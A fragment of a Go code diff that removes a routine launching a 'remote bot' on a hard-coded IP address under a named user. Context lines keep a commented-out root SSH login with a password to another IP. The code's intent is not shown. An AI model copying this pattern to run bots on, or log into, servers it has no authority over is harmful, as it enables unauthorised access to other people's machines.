@@ -142,18 +142,6 @@ func password() string {
 
 // run
 func main() {
-	fmt.Println("." + password() + ".")
-	go func() {
-		err := h.runRmoteBot("139.162.118.190", "hamza")
-		if err != nil {
-			fmt.Println(err)
-		}
-
-	}()
-	time.Sleep(time.Second * 10)
-
-	os.Exit(0)
-
 	/*
 		sshcli, err := goph.NewUnknown("root", "139.162.100.216", goph.Password(psw))
 		if err != nil {
